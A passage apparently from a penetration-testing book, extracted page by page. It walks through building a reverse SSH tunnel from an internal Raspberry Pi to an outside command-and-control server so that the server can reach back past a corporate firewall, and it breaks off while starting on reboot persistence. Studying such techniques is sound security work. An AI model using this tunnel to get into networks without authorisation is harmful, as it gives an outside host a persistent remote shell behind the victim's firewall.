  img_proc: true
- pgno: 67
  md: '# Setting up a reverse SSH tunnel


    Now that SSH is working on both hosts, we need to set up the reverse SSH tunnel.
    Taking a look at the following figure showing a simplified topology, there is
    a pretty big problem here that justifies why we need to set up a reverse SSH tunnel:


    ![](img/095df2cd1930baecbcecaa51ee3417aa_67_0.png)


    Do you see it? Well, in case you don''t, the issue is that our internal Raspberry
    Pi server is not reachable externally, since the corporate firewall is blocking
    it. There are no inbound rules or NAT polices in place to handle this sort of
    connection. So I have no issues connecting to the C&C server; however I will need
    to have the C&C server connecting back to the Raspberry Pi. So, how do we do this?
    Well, this is where a reverse SSH tunnel comes in.


    What a reverse SSH tunnel allows us to do is have a persistent tunnel setup initiated
    from the inside host to the C&C server with the -R flag as well as a predefined
    port. Because of this flag, when you SSH on the C&C server to itself on this predefined
    port, you will piggyback off of that already established tunnel.'
  merge: -1
  img_proc: true
- pgno: 68
  md: "In the following figure, you can see how the reverse SSH tunnel works to solve\
    \ our issue:\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_68_0.png)\n\nBased on\
    \ the preceding figure, here is my configuration for setting up the reverse SSH\
    \ tunnel:\n\n+   1. On the Raspberry Pi (my internal box), connect to the outside\
    \ C&C server with the -R flag as well as the port you plan to use as the redirection\
    \ port:\n+   \n+   ```\n+   ssh -R 8022:localhost:22 mycancserver.mydomain.com\n\
    +   ```\n+   \n+   2. Now, to reference this tunnel on the C&C server, you will\
    \ just run this command and will be seamlessly connected to your internal server\
    \ without any firewalls or NAT rules added.\n+   \n+   ```\n+   ssh -p 8022 localhost\n\
    +   ```\n\nEverything works as test, great! However, we are not quite done yet.\
    \ There is one more catch. What happens if your Raspberry Pi reboots? You will\
    \ have to console back in and reconnect that tunnel to your C&C server. To prevent\
    \ this problem from occurring, you will need to automate tunnel creation on startup.\
    \ The one issue with automating the preceding commands is that the session is\
    \ typically interactive and needs a password input. To overcome this, you will\
    \ use a key-based authentication setup:\n\n+   1. Generate a key pair on the inside\
    \ server or the server that will be initiating the SSH session. Make sure that\
    \ you generate the key as the user you plan to log in as:"
  merge: -1
  img_proc: true
